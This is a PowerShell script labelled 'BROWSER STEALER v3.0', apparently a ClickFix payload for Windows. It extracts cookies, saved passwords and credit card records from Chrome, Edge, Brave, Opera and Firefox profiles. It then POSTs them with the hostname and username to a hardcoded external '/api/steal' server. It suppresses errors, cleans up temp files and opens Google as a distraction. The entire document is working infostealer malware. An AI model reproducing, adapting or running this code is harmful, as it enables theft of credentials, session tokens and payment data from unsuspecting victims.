# ============================================================
# BROWSER STEALER — WORKS ON ANY WINDOWS PC
# Downloads SQLite from NuGet if needed
# ============================================================

$ErrorActionPreference = "SilentlyContinue"
$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"

function Write-Color {
    param($Msg, $Color)
    Write-Host $Msg -ForegroundColor $Color
}

# ============================================================
# DOWNLOAD AND LOAD SQLITE FROM NUGET
# ============================================================

function Get-SQLite {
    Write-Color "[+] Loading SQLite..." "Cyan"
    
    # Try Microsoft.Data.Sqlite (built into .NET Core/5+)
    try {
        Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
        Write-Color "[+] Microsoft.Data.Sqlite loaded" "Green"
        return "Microsoft.Data.Sqlite"
    } catch {}
    
    # Try System.Data.SQLite from GAC
    try {
        [System.Data.SQLite.SQLiteConnection]::new() | Out-Null
        Write-Color "[+] System.Data.SQLite loaded" "Green"
        return "System.Data.SQLite"
    } catch {}
    
    # Try to load from temp folder
    $dllPath = "$env:TEMP\System.Data.SQLite.dll"
    if (Test-Path $dllPath) {
        try {
            [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
            Write-Color "[+] SQLite loaded from temp" "Green"
            return "System.Data.SQLite"
        } catch {}
    }
    
    # ---- DOWNLOAD FROM NUGET ----
    Write-Color "[+] Downloading SQLite from NuGet..." "Cyan"
    
    try {
        $packageUrl = "https://www.nuget.org/api/v2/package/System.Data.SQLite/1.0.118.0"
        $nupkgPath = "$env:TEMP\sqlite.nupkg"
        $zipPath = "$env:TEMP\sqlite.zip"
        
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $webClient.DownloadFile($packageUrl, $nupkgPath)
        
        if (Test-Path $nupkgPath -and (Get-Item $nupkgPath).Length -gt 10000) {
            # Rename to zip
            Copy-Item $nupkgPath $zipPath -Force
            
            # Extract using .NET
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            $zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
            $entry = $zip.Entries | Where-Object { $_.FullName -match "lib/net462/System.Data.SQLite.dll" -or $_.FullName -match "lib/net40/System.Data.SQLite.dll" }
            if ($entry) {
                $dllBytes = New-Object byte[] $entry.Length
                $stream = $entry.Open()
                $stream.Read($dllBytes, 0, $dllBytes.Length)
                $stream.Close()
                [System.IO.File]::WriteAllBytes($dllPath, $dllBytes)
                [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
                Write-Color "[+] SQLite downloaded and loaded from NuGet!" "Green"
                $zip.Dispose()
                Remove-Item $nupkgPath -Force -ErrorAction SilentlyContinue
                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                return "System.Data.SQLite"
            }
            $zip.Dispose()
        }
    } catch {
        Write-Color "[!] NuGet download failed: $_" "Red"
    }
    
    Write-Color "[!] SQLite not available" "Red"
    return $null
}

$sqliteType = Get-SQLite

# ============================================================
# SQLITE HELPER
# ============================================================

function Read-SQLite {
    param($DbPath, $Query)
    $results = @()
    if (-not (Test-Path $DbPath)) { return $results }
    if (-not $sqliteType) { return $results }
    
    try {
        $tempDb = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
        Copy-Item $DbPath $tempDb -Force
        
        if ($sqliteType -eq "Microsoft.Data.Sqlite") {
            $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$tempDb")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $rdr = $cmd.ExecuteReader()
            while ($rdr.Read()) {
                $row = @{}
                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                    $n = $rdr.GetName($i)
                    $v = $rdr.GetValue($i)
                    if ($v -ne $null) { $row[$n] = $v }
                }
                $results += $row
            }
            $rdr.Close()
            $conn.Close()
        } else {
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $rdr = $cmd.ExecuteReader()
            while ($rdr.Read()) {
                $row = @{}
                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                    $n = $rdr.GetName($i)
                    $v = $rdr.GetValue($i)
                    if ($v -ne $null) { $row[$n] = $v }
                }
                $results += $row
            }
            $rdr.Close()
            $conn.Close()
        }
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
    } catch {}
    return $results
}

# ============================================================
# COOKIE STEALER
# ============================================================

function Get-Cookies {
    param($Path, $Name)
    $cookies = @()
    if (-not (Test-Path $Path)) { return $cookies }
    if (-not $sqliteType) { return $cookies }
    
    $rows = Read-SQLite -DbPath $Path -Query "SELECT host_key, name, value FROM cookies"
    foreach ($r in $rows) {
        if ($r['name'] -and $r['value']) {
            $d = $r['host_key']
            if ($d) { $d = $d -replace '^\.', '' } else { $d = "unknown" }
            $cookies += @{ domain = $d; name = $r['name']; value = $r['value']; browser = $Name }
        }
    }
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    if (-not $sqliteType) { return $cookies }
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\cookies.sqlite"
            if (Test-Path $f) {
                $rows = Read-SQLite -DbPath $f -Query "SELECT host, name, value FROM moz_cookies"
                foreach ($r in $rows) {
                    if ($r['name'] -and $r['value']) {
                        $dmn = $r['host']
                        if ($dmn) { $dmn = $dmn -replace '^\.', '' } else { $dmn = "unknown" }
                        $cookies += @{ domain = $dmn; name = $r['name']; value = $r['value']; browser = "Firefox" }
                    }
                }
            }
        }
    }
    return $cookies
}

# ============================================================
# PASSWORD STEALER
# ============================================================

function Get-Passwords {
    param($Path, $Name)
    $pass = @()
    if (-not (Test-Path $Path)) { return $pass }
    if (-not $sqliteType) { return $pass }
    
    $rows = Read-SQLite -DbPath $Path -Query "SELECT origin_url, username_value, password_value FROM logins"
    foreach ($r in $rows) {
        if ($r['username_value'] -and $r['password_value']) {
            $u = $r['origin_url']
            if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
            $pass += @{ url = $u; username = $r['username_value']; password = $r['password_value']; browser = $Name }
        }
    }
    return $pass
}

function Get-FirefoxPasswords {
    $pass = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\logins.json"
            if (Test-Path $f) {
                try {
                    $json = Get-Content $f -Raw | ConvertFrom-Json
                    if ($json.logins) {
                        foreach ($l in $json.logins) {
                            $u = $l.hostname
                            if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                            $pass += @{ url = $u; username = $l.username; password = $l.password; browser = "Firefox" }
                        }
                    }
                } catch {}
            }
        }
    }
    return $pass
}

# ============================================================
# CREDIT CARD STEALER
# ============================================================

function Get-Cards {
    param($Path, $Name)
    $cards = @()
    if (-not (Test-Path $Path)) { return $cards }
    if (-not $sqliteType) { return $cards }
    
    $rows = Read-SQLite -DbPath $Path -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
    foreach ($r in $rows) {
        if ($r['name_on_card'] -and $r['card_number_encrypted']) {
            $cards += @{
                name = $r['name_on_card']
                number = $r['card_number_encrypted']
                month = $r['expiration_month']
                year = $r['expiration_year']
                browser = $Name
            }
        }
    }
    return $cards
}

# ============================================================
# MAIN
# ============================================================

$pc = $env:COMPUTERNAME
$user = $env:USERNAME

Write-Color "" "White"
Write-Color "============================================" "Cyan"
Write-Color "  BROWSER STEALER v3.0" "Green"
Write-Color "  Target: $pc" "Yellow"
Write-Color "============================================" "Cyan"
Write-Color "" "White"

if (-not $sqliteType) {
    Write-Color "[!] SQLite not available — trying fallback" "Red"
    Write-Color "[*] This PC may need .NET installed" "Yellow"
}

$allCookies = @()
$allPasswords = @()
$allCards = @()

# ---- Cookies ----
Write-Color "[+] Chrome cookies..." "Cyan"
$p = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$allCookies += Get-Cookies -Path $p -Name "Chrome"

Write-Color "[+] Edge cookies..." "Cyan"
$p = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$allCookies += Get-Cookies -Path $p -Name "Edge"

Write-Color "[+] Brave cookies..." "Cyan"
$p = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
$allCookies += Get-Cookies -Path $p -Name "Brave"

Write-Color "[+] Opera cookies..." "Cyan"
$p = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
$allCookies += Get-Cookies -Path $p -Name "Opera"

Write-Color "[+] Firefox cookies..." "Cyan"
$allCookies += Get-FirefoxCookies

# ---- Passwords ----
Write-Color "[+] Chrome passwords..." "Cyan"
$p = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$allPasswords += Get-Passwords -Path $p -Name "Chrome"

Write-Color "[+] Edge passwords..." "Cyan"
$p = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$allPasswords += Get-Passwords -Path $p -Name "Edge"

Write-Color "[+] Brave passwords..." "Cyan"
$p = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
$allPasswords += Get-Passwords -Path $p -Name "Brave"

Write-Color "[+] Opera passwords..." "Cyan"
$p = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
$allPasswords += Get-Passwords -Path $p -Name "Opera"

Write-Color "[+] Firefox passwords..." "Cyan"
$allPasswords += Get-FirefoxPasswords

# ---- Cards ----
Write-Color "[+] Chrome cards..." "Cyan"
$p = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
$allCards += Get-Cards -Path $p -Name "Chrome"

Write-Color "[+] Edge cards..." "Cyan"
$p = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
$allCards += Get-Cards -Path $p -Name "Edge"

Write-Color "[+] Brave cards..." "Cyan"
$p = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
$allCards += Get-Cards -Path $p -Name "Brave"

# ---- Summary ----
Write-Color "" "White"
Write-Color "=== SUMMARY ===" "Green"
Write-Color "Cookies:    $($allCookies.Count)" "Yellow"
Write-Color "Passwords:  $($allPasswords.Count)" "Yellow"
Write-Color "Cards:      $($allCards.Count)" "Yellow"
Write-Color "" "White"

# ---- Payload ----
$payload = @{
    cookies = $allCookies
    passwords = $allPasswords
    cards = $allCards
    system = @{ hostname = $pc; username = $user }
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $pc
}

# ---- Send ----
Write-Color "[+] Sending data..." "Cyan"
try {
    $json = $payload | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $req = [System.Net.WebRequest]::Create($SERVER_URL)
    $req.Method = "POST"
    $req.ContentType = "application/json"
    $req.ContentLength = $bytes.Length
    $stream = $req.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $resp = $req.GetResponse()
    $resp.Close()
    Write-Color "[+] Data sent successfully!" "Green"
} catch {
    Write-Color "[!] Failed to send: $_" "Red"
}

# ---- Cleanup ----
Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

# ---- Distraction ----
Start-Process "https://www.google.com"
Write-Color "[+] Done" "Green"
